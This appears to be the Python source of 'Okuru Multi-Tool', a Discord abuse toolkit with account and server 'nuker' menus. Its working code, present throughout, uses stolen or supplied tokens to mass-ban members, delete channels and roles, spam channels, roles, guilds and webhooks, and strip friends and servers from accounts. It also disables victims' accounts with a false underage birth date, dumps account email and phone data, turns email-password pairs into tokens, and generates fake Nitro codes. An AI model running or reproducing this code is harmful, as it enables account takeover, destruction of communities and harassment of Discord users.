import os, requests, json, time, threading, random, string, base64, sys, asyncio
from itertools import cycle
from discord.ext import commands
from pypresence import Presence
from colorama import Fore


os.system(f'mode 106,26')
os.system(f'title [Okuru Multi-Tool] - Connected')

os.system('cls')
rich_presence = input(f'\u001b[38;5;21m[?]\u001b[38;5;15m Rich Presence [Y/N] : ')


def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("828547839994888192") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="multi_tool", small_image="multi_tool", large_text="Okuru Multi-Tool", start=time.time())
        except:
            pass

rich_presence = RichPresence()


with open('settings.json') as f:
    config = json.load(f)
token = config.get('accountnuketoken')
stoken = config.get('servernuketoken')
headers = {'authorization': token}
friends = open('Scraped/friends.json')
guilds = open('Scraped/guilds.json')

def Startup():
    if token_type == "user":
      client.run(stoken, bot=False)
    elif token_type == "bot":
      client.run(stoken)
def removefriends(u):
      while True:
        r = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{u}", headers=headers)
        if 'global' in r.text:
          time.sleep(r.json()['global'])
        else:
          break

def removeguilds(i):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{i}", headers=headers)
       if 'global' in r.text:
            time.sleep(r.json()['global'])
       else:
          break

def spamguilds(name):
  while True: 
    json = {'name': name, 'type': 0}
    r = requests.post('https://discord.com/api/v8/guilds', headers=headers, json=json)
    if 'global' in r.text:
      time.sleep(r.json()['global'])
    else:
      break
def removeguild():
  for g in guilds:
    threading.Thread(target=removeguilds, args=(g,)).start()

def removefriend():
  for f in friends:
    threading.Thread(target=removefriends, args=(f,)).start()
def guildspam():
  name = input("\nGuild Names: ")
  amount = input("Amount: ")
  print()
  for i in range(int(amount)):
    threading.Thread(target=spamguilds, args=(name,)).start()
def accountnuker():
  os.system('cls; clear')
  print(f'''
				    \u001b[38;5;111m╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
				    \u001b[38;5;159m╠═╣║  ║  ║ ║║ ║║║║ ║   ║║║║ ║╠╩╗║╣ ╠╦╝
				    \u001b[38;5;195m╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m

			     [+]═════════════════════[+]═══════════════════[+]
 		              ║ \u001b[38;5;27m[1] - Remove Friends  ║ \u001b[38;5;27m[4] - All In One    ║
			      ║ \u001b[38;5;27m[2] - Remove Guilds   ║ \u001b[38;5;27m[5] - Scrape Info   ║
			      ║ \u001b[38;5;27m[3] - Spam Servers    ║ \u001b[38;5;27m[6] - Back To Menu  ║
			     [+]═════════════════════[+]═══════════════════[+]
  ''')
  choice = int(input("\u001b[38;5;231m$> "))
  if choice == 1:
    removefriend()
    time.sleep(1)
    accountnuker()
  elif choice == 2:
    removeguild()
    time.sleep(1)
    accountnuker()
  elif choice == 3:
    guildspam()
    time.sleep(1)
    accountnuker()
  elif choice == 4:
    removefriend()
    removeguild()
    time.sleep(2)
    os.system('cls; clear')
    print("Done Nuking - Spam Config: \n")
    guildspam()
    time.sleep(2)
    accountnuker()
  elif choice == 5:
    os.system('python scrape.py')
    time.sleep(1)
    os.system('python main.py')
  elif choice == 6:
    mainmenu()
  else:
    print("\nInvalid Choice - Please Try Again...")
    time.sleep(2)
    accountnuker()
def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"
token_type = check_token(stoken)
if token_type == "user":
    headers = {'Authorization': f'{stoken}'}
    client = commands.Bot(command_prefix='!', case_insensitive=False, self_bot=True)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {stoken}'}
    client = commands.Bot(command_prefix='!', case_insensitive=False)
def ban(guild, member):
  while True:
    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
    if 'global' in r.text:
      time.sleep(r.json()['global'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        break
def banall():
  print()
  guild = input("\u001b[38;5;111mGuild ID: ")
  os.system('cls; clear')
  print("EAR - NUKER - ACTIVATING BAN PROCESS...")
  members = open('Scraped/members.json')
  members1 = open('Scraped/members1.json')
  for member in members:
    threading.Thread(target=ban, args=(guild, member,)).start()
  for member in members1:
    threading.Thread(target=ban, args=(guild, member,)).start()
def delchan(guild, channel):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
    if 'retry_after' in r.text:
      time.sleep(r.json()['global'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        break
def chandel():
  print()
  guild = input("\u001b[38;5;111mGuild ID: ")
  os.system('cls; clear')
  print("EAR - NUKER - ACTIVATING CHANNEL DELETION PROCESS...")
  channels = open('Scraped/channels.json')
  for channel in channels:
    threading.Thread(target=delchan, args=(guild, channel,)).start()
def delroles(guild, role):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
    if 'retry_after' in r.text:
      time.sleep(r.json()['global'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        break
def roledel():
  print()
  guild = input("\u001b[38;5;111mGuild ID: ")
  os.system('cls; clear')
  print("EAR - NUKER - ACTIVATING ROLE DELETION PROCESS...")
  roles = open('Scraped/roles.json')
  for role in roles:
    threading.Thread(target=delroles, args=(guild, role,)).start()
def spamchannel(guild, name):
  while True:
    json = {'name': name, 'type': 0}
    r = requests.post(f"https://discord.com/api/v8/guilds/{guild}/channels", headers=headers, json=json)
    if 'retry_after' in r.text:
      time.sleep(r.json()['global'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        break
def chanspam():
  print()
  guild = input("\u001b[38;5;111mGuild ID: ")
  name = input("Channel Names: ")
  amount = input("Amount: ")
  os.system('cls; clear')
  print("EAR - NUKER - ACTIVATING CHANNEL CREATION PROCESS...")
  for i in range(int(amount)):
    threading.Thread(target=spamchannel, args=(guild, name,)).start()
def spamrole(guild, name):
  while True:
    json = {'name': name, 'type': 0}
    r = requests.post(f"https://discord.com/api/v8/guilds/{guild}/roles", headers=headers, json=json)
    if 'retry_after' in r.text:
      time.sleep(r.json()['global'])
    else:
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        break
def rolespam():
  print()
  guild = input("\u001b[38;5;111mGuild ID: ")
  name = input("Role Names: ")
  amount = input("Amount: ")
  os.system('cls; clear')
  print("EAR - NUKER - ACTIVATING ROLE CREATION PROCESS...")
  for i in range(int(amount)):
    threading.Thread(target=spamrole, args=(guild, name,)).start()


  


def server():
  os.system('cls; clear')
  print(f''' 

				         \u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
				         \u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝
				         \u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m

			        [+]═════════════════════[+]═══════════════════[+]
 				 ║ \u001b[38;5;27m[1] - Ban Members     ║ [5] - Spam Roles    ║
				 ║ \u001b[38;5;26m[2] - Del Channels    ║ [6] - Nuke Server   ║
				 ║ \u001b[38;5;25m[3] - Del Roles       ║ [7] - Scrape Info   ║
				 ║ \u001b[38;5;24m[4] - Spam Channels   ║ [8] - Back To Menu  ║
				[+]═════════════════════[+]═══════════════════[+]


  ''')
  choice = int(input("\u001b[38;5;231m$> "))
  if choice == 1:
    banall()
    time.sleep(1)
    server()
  elif choice == 2:
    chandel()
    time.sleep(1)
    server()
  elif choice == 3:
    roledel()
    time.sleep(1)
    server()
  elif choice == 4:
    chanspam()
    time.sleep(1)
    server()
  elif choice == 5:
    rolespam()
    time.sleep(1)
    server()
  elif choice == 6:
    banall()
    chandel()
    roledel()
    os.system('cls; clear')
    print('NUKE - CONFIG SETTINGS - EAR NUKER')
    chanspam()
    rolespam
    time.sleep(1)
    server()
  elif choice == 7:
    print("\nType !scrape To Get Started.")
  elif choice == 8:
    mainmenu()
  else:
    print("\nInvalid Choice - Please Try Again...")
    time.sleep(2)
    server()
@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    try:
        os.remove("Scraped/members.json")
        os.remove("Scraped/channels.json")
        os.remove("Scraped/roles.json")
    except:
        pass
    membercount = 0
    with open('Scraped/members.json', 'a') as f:
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"Scraped {membercount} Members")
    channelcount = 0
    with open('Scraped/channels.json', 'a') as f:
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"Scraped {channelcount} Channels")
    rolecount = 0
    with open('Scraped/roles.json', 'a') as f:
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"Scraped {rolecount} Roles")
    time.sleep(3)
    server()
def tokengen():
  os.system('cls; clear')
  print('[EAR TOOLKIT] - TOKEN GENERATOR: \n')
  try:
    amount = int(input('Amount: '))
    print()
    value = 1
    while value <= amount:
      code = "Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
      print(f'{code}')
      value += 1
    print('')
    print('Press [Enter] key to go back to Main Menu.')
    while True:
        input()
        os.system('cls; clear')
        tool()
  except ValueError:
    print('Invalid choice')
    print('Press [Enter] key to go back to Main Menu.')
    while True:
        input()
        os.system('cls; clear')
        tool()
def nitrogen():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - NITRO GENERATOR: \n')
    try:
      amount = int(input('Amount: '))
      print()
      value = 1
      while value <= amount:
        code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        print(f'{code}')
        value += 1
      print('')
      print('Press [Enter] key to go back to Main Menu.')
      while True:
          input()
          os.system('cls; clear')
          tool()
    except ValueError:
      print('Invalid choice')
      print('Press [Enter] key to go back to Main Menu.')
      while True:
          input()
          os.system('cls; clear')
          tool()
def deleter():
  os.system('cls; clear')
  print('[EAR TOOLKIT] - WEBHOOK DELETION: \n')
  try:
    webhook = input("Webhook: ")
    requests.delete(webhook.rstrip())
    print('\n[SUCCESFUL] - Webhook has been deleted')
  except:
    print("\n[UNSUCCESFUL] - Webhook could not be deleted")
def spammer():
  os.system('cls; clear')
  print('[EAR TOOLKIT] - WEBHOOK SPAM: \n')
  try:
    webhook = input("Webhook: ")
    message = input("Message: ")
    amount = int(input("Amount: "))
    print()
    for i in range(amount):
      _data = requests.post(webhook, json={'content': message}, headers={'Content-Type': 'application/json'})
      if _data.status_code < 400:
        print('[SUCCESSFUL] - Sent a new message!')
  except:
    print("[UNSUCCESSFUL] - Could Not Spam Webhook")
def hypesquad():
    os.system('cls; clear')
    print("[EAR TOOLKIT] - HYPESQUAD CHANGER: \n")
    print("""
[1] Bravery
[2] Brilliance
[3] Balance
        """)
    house = input('Your choice: ')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:

      headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
      if house == "1":
          payload = {'house_id': 1}
      elif house == "2":
          payload = {'house_id': 2}
      elif house == "3":
          payload = {'house_id': 3}
      r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
      if r.status_code == 204:
        print('\n[SUCCESFULL] - Changed Your Hypesquad\n')
        print('Press [Enter] key to go back to Main Menu.')
        while True:
            input()
            os.system('cls; clear')
            tool()
    else:
      print('\nInvalid Token\n')
      print('Press [Enter] key to go back to Main Menu.')
      while True:
          input()
          os.system('cls; clear')
          tool()
def bantoken():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - DISABLE TOKEN: \n')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.patch('https://discordapp.com/api/v8/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
        if r.status_code == 400:
          print('\n[SUCCESFULL] Disabled Token\n')
          print('Press [Enter] key to go back to Main Menu.')
          while True:
              input()
              os.system('cls; clear')
              tool()
        else:
          print('\n[UNSUCCESFULL]  - Couldnt Ban Token\n')
          print('Press [Enter] key to go back to Main Menu.')
          while True:
              input()
              os.system('cls; clear')
              tool()
    else:
        print('\nInvalid Token\n')
        input('Press [Enter] key to go back to Main Menu.')
        tool()
        os.system('cls; clear')
def unverifytoken():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - UNVERIFY TOKEN: \n')

    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.post('https://discordapp.com/api/v8/users/@me/relationships', headers={'Authorization': token, 'User-Agent': 'discordbot'}, json={'username': 'LMAO', 'discriminator': 6572})
        if r.status_code == 204:
            print('\n[SUCCESFULL] - Unverified Token\n')
            print('Press [Enter] key to go back to Main Menu.')
            while True:
                input()
                os.system('cls; clear')
                tool()
        else:
          print('\n[UNSUCCESFULL] - Failed to Unverify Token\n')
          print('Press [Enter] key to go back to Main Menu.')
          while True:
              input()
              os.system('cls; clear')
              tool()
    else:
        print('\n[UNSUCCESFULL - ]Invalid token')
        print('Press [Enter] key to go back to Main Menu.')
        while True:
            input()
            os.system('cls; clear')
            tool()
def tokenfromuserid():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - HALF TOKEN FROM USER ID: \n')
    userid = input('UserID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    print()
    print('Half Token: --\/')
    print(bas64_bytes.decode('utf-8'))
    print('\nPress [Enter] key to go back to Main Menu.')
    while True:
        input()
        os.system('cls; clear')
        tool()
def tokeninfo():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - TOKEN INFO: \n')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      print('\n - Token is valid - ')
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      phone = r.json()['phone']
      email = r.json()['email']
      mfa = r.json()['mfa_enabled']
      verified = r.json()['verified']
      print(f'''
User: {userName}
ID: {userID}
Phone: {phone}
Email: {email}
MFA: {mfa}
Verified: {verified}
Token: {token}
            ''')
      print('\nPress [Enter] key to go back to Main Menu.')
      while True:
          input()
          tool()
          os.system('cls; clear')
    else:
      print('\nInvalid token')
      print('\nPress [Enter] key to go back to Main Menu.')
      input()
      tool()
      os.system('cls; clear')
def tokenfetcher():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - TOKEN FETCHER: \n')
    email = input('Email: ')
    password = input('Password: ')
    data={'email': email, 'password': password, 'undelete': "false"}
    headers={'content-type': "application/json", 'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
    r = requests.post('https://discord.com/api/v8/auth/login', json=data, headers=headers)
    if r.status_code == 200:
        token = r.json()['token']
        print(f'TOKEN: {token}')
        print('\nPress [Enter] key to go back to Main Menu.')
        input()
        tool()
        os.system('cls; clear')
    elif "PASSWORD_DOES_NOT_MATCH" in r.text:
        print('\nInvalid Password')    
        print('\nPress [Enter] key to go back to Main Menu.')
        input()
        tool()
        os.system('cls; clear')
    elif "captcha-required" in r.text:
        print('\nDiscord Returned Captcha, Try Again Later')   
        print('\nPress [Enter] key to go back to Main Menu.')
        input()
        tool()
        os.system('cls; clear')
    else:
      print('\nInvalid Email Or Password')
      print('\nPress [Enter] key to go back to Main Menu.')
      while True:
          input()
          os.system('cls; clear')
          tool()
def trolltoken():
    os.system('cls; clear')
    print('[EAR TOOLKIT] - TROLLING TOKEN: \n')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    amount = int(input('Amount: '))
    print()
    modes = cycle(["light", "dark"])
    for i in range(amount):
      print(f'Token has been trolled [{i}]')
      time.sleep(0.12)
      setting = {'theme': next(modes)}
      requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
    input('\nFinished Trolling\n\nPress [Enter] key to go back to Main Menu.')
    tool()
def tool():
  os.system('cls; clear')
  print(f'''
				       \u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦   ╔╦╗╦ ╦╦ ╔╦╗╦╔╦╗╔═╗╔═╗╦
				       \u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║   ║║║║ ║║  ║ ║ ║ ║ ║║ ║║
				       \u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝   ╩ ╩╚═╝╩═╝╩ ╩ ╩ ╚═╝╚═╝╩═╝\u001b[38;5;26m

			 [+]═══════════════════════════════[+]════════════════════════════════[+]
			  ║ \u001b[38;5;27m[1] - Token From Email;Pass     ║ \u001b[38;5;27m[7] - Change Hypesquad House     ║
			  ║ \u001b[38;5;26m[2] - Troll Token / Cycle       ║ \u001b[38;5;26m[8] - Spam Given Webhook         ║
			  ║ \u001b[38;5;27m[3] - Token Information         ║ \u001b[38;5;27m[9] - Delete Given Webhook       ║
		          ║ \u001b[38;5;27m[4] - Half Token From UserID    ║ \u001b[38;5;27m[10] - Generate Nitro Codes      ║
			  ║ \u001b[38;5;27m[5] - Unverify Account Token    ║ \u001b[38;5;27m[11] - Generate Tokens           ║
		          ║ \u001b[38;5;26m[6] - Disable Account Token     ║ \u001b[38;5;26m[12] - Back To Main Menu.        ║
			 [+]═══════════════════════════════[+]════════════════════════════════[+]

  ''')
  choice = int(input("\u001b[38;5;231m$> "))
  if choice == 1:
    tokenfetcher()
  elif choice == 2:
    trolltoken()
  elif choice == 3:
    tokeninfo()
  elif choice == 4:
    tokenfromuserid()
  elif choice == 5:
    unverifytoken()
  elif choice == 6:
    bantoken()
  elif choice == 7:
    hypesquad()
  elif choice == 8:
    spammer()
    print('\nPress [Enter] key to go back to Main Menu.')
    input()
    tool()
  elif choice == 9:
    deleter()
    print('\nPress [Enter] key to go back to Main Menu.')
    input()
    tool()
  elif choice == 10:
    nitrogen()
  elif choice == 11:
    tokengen()
  elif choice == 12:
    mainmenu()
  else:
    print("\nInvalid Choice - Please Try Again...")
    time.sleep(2)
    tool()
def credits():
  os.system('cls; clear')
  print(f'''
                             \u001b[38;5;111m╔═╗╦═╗╔═╗╔╦╗╦╔╦╗╔═╗
                             \u001b[38;5;159m║  ╠╦╝║╣  ║║║ ║ ╚═╗
                             \u001b[38;5;195m╚═╝╩╚═╚═╝═╩╝╩ ╩ ╚═╝\u001b[38;5;26m

            [+]═════════════════════════[+]═════════════════════════[+]
             ║       Made By:            ║  Yum, RyZen, Gowixx, Xaiden ║      
            [+]═════════════════════════[+]═════════════════════════[+]
  ''')
def mainmenu():
  os.system('cls; clear')
  print(f'''
                               \u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╦╗╦ ╦╦ ╔╦╗╦  ╔╦╗╔═╗╔═╗╦ 
                               \u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║║  ║ ║   ║ ║ ║║ ║║ 
                               \u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╩ ╩╚═╝╩═╝╩ ╩   ╩ ╚═╝╚═╝╩═╝\u001b[38;5;26m

                            [+]═══════════════════[+]═══════════════════[+]
                             ║ [1] - ACCOUNT NUKER ║ [3] - MULTITOOL     ║
                             ║ [2] - SERVER NUKER  ║ [4] - CREDITS       ║
                            [+]═══════════════════[+]═══════════════════[+]

  ''')
  choice = int(input("\u001b[38;5;231m$> "))
  if choice == 1:
    accountnuker()
  elif choice == 2:
    os.system('cls; clear')
    print("Downloading Requirements...")
    os.system('pip install discord.py==1.4')
    server()
    Startup()
  elif choice == 3:
    tool()
  elif choice == 4:
    credits()
    input()
    mainmenu()
  else:
    print("\nInvalid Choice - Please Try Again...")
    time.sleep(2)
    mainmenu()
  if input.isdigit():
    print("Test")
mainmenu() 